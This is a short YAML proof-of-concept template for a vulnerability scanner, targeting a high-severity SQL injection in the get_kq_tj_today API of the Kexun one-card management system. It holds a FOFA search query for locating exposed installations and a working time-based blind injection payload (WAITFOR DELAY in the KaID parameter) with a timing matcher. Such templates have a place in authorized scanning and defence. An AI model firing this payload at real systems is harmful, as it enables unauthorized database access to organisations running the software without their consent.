id: poc-yaml-kxsoft-get-kq-tj-today-sqli
info:
  name: 科讯一卡通管理系统 get_kq_tj_today SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 一卡通管理系统
  fofa: body="http://www.ahkxsoft.com/" && body="一卡通登录"
variables:
  t1: random_int(5,10)
  t2: t1 + 2
requests:
- method: GET
  path: /api/get_kq_tj_today?KaID=1%27;WAITFOR%20DELAY%20%270:0:{{.t1}}%27--
  expression: "status_code == 200 && \ncontains(body,\"actualNum\") &&\ncontains(body,\"\
    offworkstate\") &&\ncontains(content_type,\"application/json\") &&\nduration >\
    \ t1 &&\nduration < t2\n"
transport: http
